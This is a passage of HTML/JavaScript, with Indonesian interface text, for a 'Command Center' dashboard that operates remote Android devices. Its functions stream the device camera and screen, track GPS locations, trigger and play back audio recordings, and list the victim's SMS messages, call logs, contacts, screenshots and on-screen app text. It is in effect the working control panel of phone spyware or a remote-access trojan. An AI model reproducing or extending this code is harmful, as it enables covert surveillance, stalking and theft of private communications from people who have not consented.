                document.getElementById('streamWait').innerHTML='<div style="text-align:center;color:var(--yellow)"><div style="font-size:28px;margin-bottom:6px">⏳</div><div style="font-size:11px">Menunggu frame dari device...</div><div style="font-size:9px;color:var(--text-muted);margin-top:3px">Device sedang memproses. Frame akan muncul otomatis.</div></div>';
            }
        };
        tmpImg.onerror=function(){
            img.style.display='none';
            document.getElementById('streamWait').style.display='flex';
        };
        tmpImg.src=`${B}/api/frame/${encodeURIComponent(name)}?t=${Date.now()}`;
    };
    refresh();
    pollIv=setInterval(refresh,1500);
    document.getElementById('streamLive').style.display='flex';
    document.getElementById('streamFsBtn').style.display='block';
    document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind waiting"><div class="cc-pulse-dot" style="background:var(--yellow)"></div> ⏳ Menunggu frame dari device...</div>';
    document.getElementById('btnPoll').classList.add('active');
    document.getElementById('btnMjpeg').classList.remove('active');
    addLog('🔄 Snapshot polling started');
}

function startMjpeg(){
    if(!sel)return;
    stopStream();streamMode='mjpeg';
    const img=document.getElementById('streamImg');
    img.src=`${B}/api/stream/${encodeURIComponent(sel.device_name)}`;
    document.getElementById('streamLive').style.display='flex';
    document.getElementById('streamFsBtn').style.display='block';
    document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind recording"><div class="cc-pulse-dot" style="background:var(--red)"></div> 📹 MJPEG Stream aktif (~20fps)</div>';
    document.getElementById('btnMjpeg').classList.add('active');
    document.getElementById('btnPoll').classList.remove('active');
    addLog('📹 MJPEG stream started');
}

function viewScreen(){
    if(!sel)return;
    stopStream();streamMode='screen';
    const img=document.getElementById('streamImg');
    const name=sel.device_name;
    const refresh=()=>{
        if(streamMode!=='screen')return;
        img.src=`${B}/api/frame/${encodeURIComponent(name)}?type=screen&t=${Date.now()}`;
    };
    refresh();
    pollIv=setInterval(refresh,2000);
    document.getElementById('streamLive').style.display='flex';
    document.getElementById('streamFsBtn').style.display='block';
    document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind tracking"><div class="cc-pulse-dot" style="background:var(--cyan)"></div> 🖥️ Screen capture stream</div>';
    addLog('🖥️ Screen viewer started');
}

function stopStream(){
    if(pollIv){clearInterval(pollIv);pollIv=null;}
    streamMode='none';
    const img=document.getElementById('streamImg');
    img.src='';img.style.display='none';
    document.getElementById('streamWait').style.display='flex';
    document.getElementById('streamLive').style.display='none';
    document.getElementById('streamFsBtn').style.display='none';
    document.getElementById('btnMjpeg').classList.remove('active');
    document.getElementById('btnPoll').classList.remove('active');
}

// Info
function renderInfo(){
    const g=document.getElementById('infoGrid');
    if(!sel){g.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">📊</div><div>Pilih device</div></div>';return;}
    const d=sel,m=(d.active_modules||[]).join(', ')||'—';
    g.innerHTML=[
        ['DEVICE',d.device_name],['STATUS',`<span style="color:var(--${d.status==='live'?'green':d.status==='online'?'yellow':'red'})">${d.status.toUpperCase()}</span>`],
        ['IP',d.local_ip||'—'],['SCREEN',d.screen_on===true?'☀️ ON':d.screen_on===false?'🌙 OFF':'—'],
        ['MODULES',m],['LAST SEEN',tAgo(d.last_heartbeat_at)],['LENS',d.lens||'—'],['PORT',d.port||'—']
    ].map(([l,v])=>`<div class="cc-info-item"><label>${l}</label><span>${v}</span></div>`).join('');
    fetchDetail();
}

async function fetchDetail(){
    if(!sel)return;
    try{const r=await fetch(`${B}/api/device-detail/${encodeURIComponent(sel.device_name)}`);const j=await r.json();
    if(j.info&&Object.keys(j.info).length){const g=document.getElementById('infoGrid');
    ['battery_level','model','manufacturer','os_version','android_version','total_storage','free_storage','wifi_ssid'].forEach(k=>{
        if(j.info[k])g.innerHTML+=`<div class="cc-info-item"><label>${k.replace(/_/g,' ').toUpperCase()}</label><span>${j.info[k]}</span></div>`;
    });
    if(j.apps?.length)g.innerHTML+=`<div class="cc-info-item"><label>APPS</label><span>${j.apps.length} installed</span></div>`;}}catch(e){}
}

function renderAct(){
    const p=document.getElementById('sideAct'),n=document.getElementById('actName');
    if(!sel){p.style.display='none';return;}
    p.style.display='block';n.textContent=sel.device_name;
}

// Data fetchers
async function fetchLoc(){
    if(!sel)return;const el=document.getElementById('locList');
    try{const r=await fetch(`${B}/api/locations/${encodeURIComponent(sel.device_name)}`);const j=await r.json();const d=j.data||[];
    if(!d.length){el.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">📍</div><div>Belum ada data lokasi</div><div style="font-size:9px;color:var(--text-muted)">Tekan "📍 Lacak Sekali"</div></div>';return;}
    document.getElementById('locStatus').innerHTML=document.getElementById('locStatus').innerHTML||'';
    el.innerHTML=d.map(l=>{const m=`https://maps.google.com/?q=${l.latitude},${l.longitude}`;
    return `<div class="cc-card"><div style="display:flex;justify-content:space-between;align-items:center"><div><div style="font-size:11px;font-weight:600">📍 ${Number(l.latitude).toFixed(6)}, ${Number(l.longitude).toFixed(6)}</div><div style="font-size:9px;color:var(--text-dim)">±${Number(l.accuracy).toFixed(0)}m</div></div><div style="text-align:right"><div class="cc-badge c">${fmtT(l.timestamp)}</div><div style="margin-top:3px"><a href="${m}" target="_blank" class="cc-maps">🗺 Google Maps</a></div></div></div></div>`;}).join('');
    }catch(e){el.innerHTML='<div class="cc-empty">Error</div>';}
}

async function fetchAud(){
    if(!sel)return;const el=document.getElementById('audList');
    try{const r=await fetch(`${B}/api/audio-list/${encodeURIComponent(sel.device_name)}`);const j=await r.json();const d=j.data||[];
    if(!d.length){el.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">🎙</div><div>Belum ada rekaman</div><div style="font-size:9px;color:var(--text-muted)">Tekan "🎙 Rekam" lalu tunggu ~2 menit</div></div>';return;}
    el.innerHTML=d.map(a=>{const sz=a.size?(a.size/1024).toFixed(1)+' KB':'—';
    return `<div class="cc-audio"><div style="min-width:55px"><div class="cc-badge ${a.type==='live'?'r':'g'}">${a.type==='live'?'LIVE':'CLIP'}</div><div style="font-size:8px;color:var(--text-dim);margin-top:1px">${fmtT(a.timestamp)}</div><div style="font-size:8px;color:var(--text-muted)">${sz}</div></div><audio controls preload="none" src="${a.url}"></audio></div>`;}).join('');
    }catch(e){el.innerHTML='<div class="cc-empty">Error</div>';}
}

async function fetchAct(){
    if(!sel)return;const el=document.getElementById('actList');
    try{const r=await fetch(`${B}/api/activity-logs/${encodeURIComponent(sel.device_name)}`);const j=await r.json();const d=j.data||[];
    if(!d.length){el.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">📋</div><div>Belum ada log</div></div>';return;}
    el.innerHTML=`<table class="cc-tbl"><thead><tr><th>WAKTU</th><th>APP</th><th>KONTEN</th></tr></thead><tbody>`+d.map(a=>{
    const txt=(a.texts||[]).join(' • ').substring(0,100);
    return `<tr><td><span class="cc-badge c">${fmtT(a.timestamp)}</span></td><td style="color:var(--green)">${a.app_label||a.app_package||'—'}</td><td style="color:var(--text-dim)">${txt||'—'}</td></tr>`;}).join('')+'</tbody></table>';
    }catch(e){el.innerHTML='<div class="cc-empty">Error</div>';}
}

async function fetchSms(){
    if(!sel)return;const el=document.getElementById('smsList');
    try{const r=await fetch(`${B}/api/sms-logs/${encodeURIComponent(sel.device_name)}`);const j=await r.json();const d=j.data||[];
    if(!d.length){el.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">📩</div><div>Belum ada SMS</div></div>';return;}
    el.innerHTML=`<table class="cc-tbl"><thead><tr><th>WAKTU</th><th>TIPE</th><th>NOMOR</th><th>ISI</th></tr></thead><tbody>`+d.slice(0,80).map(s=>{
    const isIn=(s.type||'').toLowerCase().includes('inbox')||s.type=='1';
    return `<tr><td style="white-space:nowrap;font-size:9px">${s.date||'—'}</td><td><span class="cc-badge ${isIn?'g':'y'}">${isIn?'IN':'OUT'}</span></td><td style="color:var(--cyan)">${s.address||s.number||'—'}</td><td style="color:var(--text-dim);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.body||'—'}</td></tr>`;}).join('')+'</tbody></table>';
    }catch(e){el.innerHTML='<div class="cc-empty">Error</div>';}
}

async function fetchCalls(){
    if(!sel)return;const el=document.getElementById('callsList');
    try{const r=await fetch(`${B}/api/call-logs/${encodeURIComponent(sel.device_name)}`);const j=await r.json();const d=j.data||[];
    if(!d.length){el.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">📞</div><div>Belum ada panggilan</div></div>';return;}
    const tm={'1':'📥 IN','2':'📤 OUT','3':'❌ MISS','5':'📵 REJ'};
    el.innerHTML=`<table class="cc-tbl"><thead><tr><th>WAKTU</th><th>TIPE</th><th>NOMOR</th><th>DURASI</th></tr></thead><tbody>`+d.slice(0,80).map(c=>{
    const t=tm[c.type]||c.type||'—';const dur=c.duration?`${Math.floor(c.duration/60)}m${c.duration%60}s`:'—';const miss=c.type=='3'||c.type=='5';
    return `<tr><td style="white-space:nowrap;font-size:9px">${c.date||'—'}</td><td><span class="cc-badge ${miss?'r':'g'}">${t}</span></td><td style="color:var(--cyan)">${c.number||'—'}</td><td>${dur}</td></tr>`;}).join('')+'</tbody></table>';
    }catch(e){el.innerHTML='<div class="cc-empty">Error</div>';}
}

async function fetchCon(){
    if(!sel)return;const el=document.getElementById('conList');
    try{const r=await fetch(`${B}/api/contacts/${encodeURIComponent(sel.device_name)}`);const j=await r.json();const d=j.data||[];
    if(!d.length){el.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">👤</div><div>Belum ada kontak</div></div>';return;}
    el.innerHTML=`<div style="font-size:9px;color:var(--text-dim);margin-bottom:4px">Total: ${d.length} kontak</div><table class="cc-tbl"><thead><tr><th>NAMA</th><th>NOMOR</th></tr></thead><tbody>`+d.slice(0,150).map(c=>{
    const ph=Array.isArray(c.phones)?c.phones.join(', '):(c.phone||c.number||'—');
    return `<tr><td>${c.name||'—'}</td><td style="color:var(--cyan)">${ph}</td></tr>`;}).join('')+'</tbody></table>';
    }catch(e){el.innerHTML='<div class="cc-empty">Error</div>';}
}

async function fetchSnap(){
    if(!sel)return;const el=document.getElementById('snapList');
    try{const r=await fetch(`${B}/api/screenshots/${encodeURIComponent(sel.device_name)}`);const j=await r.json();const d=j.data||[];
    if(!d.length){el.innerHTML='<div class="cc-empty" style="grid-column:1/-1"><div class="cc-empty-icon">📸</div><div>Belum ada screenshot</div></div>';return;}
    el.innerHTML=d.map(s=>`<div style="cursor:pointer" onclick="openFs('${esc(sel.device_name)}','${s.url}')"><img src="${s.url}" style="width:100%;border-radius:3px;border:1px solid var(--border)" alt=""><div style="font-size:8px;color:var(--text-dim);margin-top:1px">${s.created_at||''}</div></div>`).join('');
    }catch(e){el.innerHTML='<div class="cc-empty" style="grid-column:1/-1">Error</div>';}
}

// Fullscreen
function openFs(n,s){document.getElementById('fsImg').src=s;document.getElementById('fsName').textContent=n||'';document.getElementById('fs').classList.add('on');}
function closeFs(){document.getElementById('fs').classList.remove('on');document.getElementById('fsImg').src='';}
document.addEventListener('keydown',e=>{if(e.key==='Escape')closeFs();});

// Sidebar
function toggleSide(f){const s=document.getElementById('side'),o=document.getElementById('sideOv');const v=f!==undefined?f:!s.classList.contains('on');s.classList.toggle('on',v);o.classList.toggle('on',v);}

// Stats
function updateStats(){document.getElementById('cLive').textContent=devs.filter(d=>d.status==='live').length;document.getElementById('cOn').textContent=devs.filter(d=>d.status==='online').length;document.getElementById('cOff').textContent=devs.filter(d=>d.status==='offline').length;}

// Log
function addLog(m,e){const t=new Date(),ts=[t.getHours(),t.getMinutes()].map(v=>String(v).padStart(2,'0')).join(':');logs.unshift({ts,m,e});logs=logs.slice(0,15);document.getElementById('logBar').innerHTML=logs.map(l=>`<div class="cc-log-item"><span class="cc-log-time">${l.ts}</span><span style="color:${l.e?'var(--red)':'var(--text-dim)'}">${l.m}</span></div>`).join('');}

// Toast
function toast(m,e){const el=document.getElementById('toast');el.textContent=m;el.className=`cc-toast show ${e?'err':''}`;setTimeout(()=>el.classList.remove('show'),3000);}

// Helpers
function tAgo(d){if(!d)return'—';const s=Math.floor((Date.now()-new Date(d).getTime())/1000);if(s<5)return'now';if(s<60)return s+'s';if(s<3600)return Math.floor(s/60)+'m';if(s<86400)return Math.floor(s/3600)+'h';return Math.floor(s/86400)+'d';}
function fmtT(d){if(!d)return'—';try{const t=new Date(d);return[t.getHours(),t.getMinutes(),t.getSeconds()].map(v=>String(v).padStart(2,'0')).join(':');}catch(e){return d;}}
function css(n){return n.replace(/[^a-zA-Z0-9]/g,'_');}
function esc(s){return s.replace(/'/g,"\\'");}
window.addEventListener('resize',renderCams);

// Init
addLog('🚀 Command Center ready');
fetchDevs();
setInterval(fetchDevs,10000);
setInterval(()=>{if(sel&&curTab!=='stream')loadTab(curTab);},15000);
</script>
</body>
</html>
